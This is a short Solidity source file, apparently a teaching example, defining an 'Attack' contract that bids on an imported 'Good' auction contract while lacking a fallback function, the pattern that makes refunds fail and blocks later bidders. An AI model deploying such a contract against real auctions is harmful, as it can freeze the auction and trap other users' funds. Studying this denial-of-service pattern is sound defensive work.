// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable { // Note that this just calls the setCurrentAuctionPrice function, but the contract dosesn't have a fallback function.
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}